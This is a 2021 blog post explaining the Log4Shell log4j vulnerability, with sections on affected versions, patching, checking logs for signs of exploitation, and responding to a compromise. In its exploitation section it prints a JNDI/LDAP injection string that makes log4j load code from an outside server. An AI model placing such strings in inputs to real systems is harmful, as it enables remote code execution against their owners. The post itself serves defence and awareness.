---
layout: post
title: Log4Shell: The log4j Javageddon
slug: the-log4j-javageddon
lang: en
author: Martin Thoma
date: 2021-12-11 15:33
category: Security
tags: Security, Java
featured_image: logos/java.png
summary: What it is, check if you are affected, what to do
medium_url: https://medium.com/@martinthoma/the-log4j-javageddon-eec906b5e6fa
---
**Log4j** is probably the most commonly used logging library for Java. It has a critical vulnerability which is **trivial to exploit** and **allows remote code execution**. It became public by a [pull request #608](https://github.com/apache/logging-log4j2/pull/608) opened on GitHub on 30th of November 2021.

## How CVE-2021–44228 can be exploited

Remote code execution is possible if an attacker can make log4j log a specific string. They look like this:

```
${jndi:ldap://42.123.456.789}
```

log4j will execute code from that LDAP server. I have also seen base64-encoded commands within the path of the URL.

More information is in [CVE-2021–44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

## Am I affected?

Most likely. Just look at who is confirmed to be affected:

[**GitHub - YfryTchsGD/Log4jAttackSurface** *Log4j impact on manufacturers and components summary from the Internet community. If Manufacturer or Component is not…*](https://github.com/YfryTchsGD/Log4jAttackSurface)

The problem is not only that you might use log4j (versions 2.0 to 2.14.1) directly in your software, but also that you might use **tools that use log4j**. For example, your logging / monitoring / alerting / dashboard solutions might use log4j.

You can use this vulnerability checker:

[**Huntress - Log4Shell Tester** *Our team is continuing to investigate CVE-2021-44228, a critical vulnerability that's affecting a Java logging package…*](https://log4shell.huntress.com/)

## Mitigations: What can I do?

Update your software to a patched version or patch the software yourself.

The first recommendation was to set `log4j2.formatMsgNoLookups=true` or update log4j2 to 2.15.0 ([source](https://news.ycombinator.com/item?id=29507263)). Both turned out to be insufficient (CVE-2021-45046, CVE-2021-45105): update log4j2 to 2.17.1 or higher. The config might be in a `jvm.options` file.

Just looking at [this GitHub search](https://github.com/search?o=desc&q=CVE-2021-44228&s=comments&type=Issues) or [this Twitter search](https://twitter.com/search?q=CVE-2021-44228) shows how many companies, services, and how much software is affected. There is a [curated list of affected services and software](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592). It’s pretty long, but for sure not all of it.

## I was affected — but was it exploited?

In order to see if the vulnerability was exploited, look for `jndi:ldap` in your logs. That might be `/var/log/syslog` and the archived files:

```
$ zgrep -i "jndi" /var/log/syslog
$ zgrep -i "jndi" /var/log/syslog.1
$ zgrep -i "jndi" /var/log/syslog.2.gz
```

You can then search for the found IPs and see if your machine had connections to that IP.

However, if you search like this you will only find the most obvious issues. There are many ways to hide the attack:

See for example [this tweet by Rezn0k](https://x.com/Rezn0k/status/1469523006015750146).

## What’s next?

If you think your systems were compromised, have a look at this:

[**How do I deal with a compromised server?** *Originally from serverfault. Thanks to Robert Moir (RobM) It's hard to give specific advice from what you've posted…*](https://security.stackexchange.com/a/39232/3286)

The important part is that it’s not enough to just apply the patch. When the attacker was on your system, they might have gotten your credentials to other systems or might have installed malicious software.

## More information

[**Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package | LunaSec** *· 7 min read Updated @ December 10th, 10am PST A few hours ago, a 0-day exploit in the popular Java logging library…*](https://www.lunasec.io/docs/blog/log4j-zero-day/)
